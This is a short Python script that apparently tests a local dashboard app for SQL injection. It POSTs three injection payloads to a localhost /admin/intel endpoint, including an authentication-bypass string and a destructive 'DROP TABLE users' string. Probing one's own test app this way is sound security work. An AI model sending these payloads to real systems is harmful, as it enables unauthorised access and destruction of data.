# sqli_test.py
import requests
url = "http://127.0.0.1:5000/fake_dashboard"  # or target search endpoint that logs search
# If fake-dashboard has a search POST to /admin/intel (or similar), adapt URL.
payloads = ["' OR 1=1 --", "' UNION SELECT NULL --", "'; DROP TABLE users; --"]
for p in payloads:
    r = requests.post("http://127.0.0.1:5000/admin/intel", data={'q': p})  # adapt to actual endpoint
    print("sent", p, r.status_code)
